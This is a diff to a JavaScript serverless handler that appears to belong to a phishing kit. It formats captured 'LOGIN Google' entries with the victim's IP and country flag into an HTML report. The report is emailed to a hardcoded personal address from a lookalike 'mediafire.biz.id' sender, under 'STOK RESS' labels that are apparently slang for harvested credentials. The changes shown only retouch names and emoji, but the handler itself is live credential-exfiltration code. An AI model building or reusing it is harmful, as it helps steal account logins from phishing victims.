@@ -45,12 +45,12 @@ export default async function handler(req, res) {
             return res.status(400).json({ error: "BODY_EMPTY" });
         }
 
-        const NAMA  = process.env.RESS_NAME  || "RESS KENZO";
+        const NAMA  = process.env.RESS_NAME  || "STOK RESS KENZO";
         const EMAIL = process.env.RESS_EMAIL || "medikaputra5@gmail.com";
 
         const flag = countryFlag(d.negaraKode || "");
 
-        // Preview text = format ID + bendera + info
+        // Preview text = format sesuai contoh
         const previewText = "ID " + flag + " | +62 | LOGIN Google | IP " + (d.ip || "-");
 
         const htmlBody = `
@@ -60,7 +60,7 @@ export default async function handler(req, res) {
 <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
   <div style="max-width:600px;margin:auto;background:#fff;border-radius:10px;overflow:hidden">
     <div style="background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;color:#fff">
-      <h1 style="margin:0;font-size:22px">🀄 ${NAMA} 🀄</h1>
+      <h1 style="margin:0;font-size:22px">🕵️ ${NAMA} 🕵️</h1>
     </div>
     <div style="padding:25px">
 
@@ -108,7 +108,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: NAMA + " <noreply@mediafire.biz.id>",
                 to: [EMAIL],
-                subject: "🀄 " + NAMA + " 🀄",
+                subject: "🕵️ " + NAMA + " 🕵️",
                 html: htmlBody
             })
         });
